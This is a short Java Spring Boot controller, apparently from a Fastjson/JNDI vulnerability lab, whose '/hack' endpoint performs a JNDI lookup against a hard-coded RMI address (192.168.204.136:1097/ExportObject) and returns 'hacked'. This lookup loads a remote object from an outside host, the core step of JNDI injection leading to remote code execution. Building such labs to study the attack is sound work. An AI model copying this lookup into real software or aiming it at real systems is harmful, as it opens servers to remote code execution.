package com.maoge.fastjsonvlu.ldap.aa;

import lombok.extern.slf4j.Slf4j;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;

import javax.naming.InitialContext;

@RestController
@Slf4j
public class Controller {

    @GetMapping("/hack")
    public String fm() throws Exception {
        log.info("join");
        new InitialContext().lookup("rmi://192.168.204.136:1097/ExportObject");
        return "hacked";
    }




}
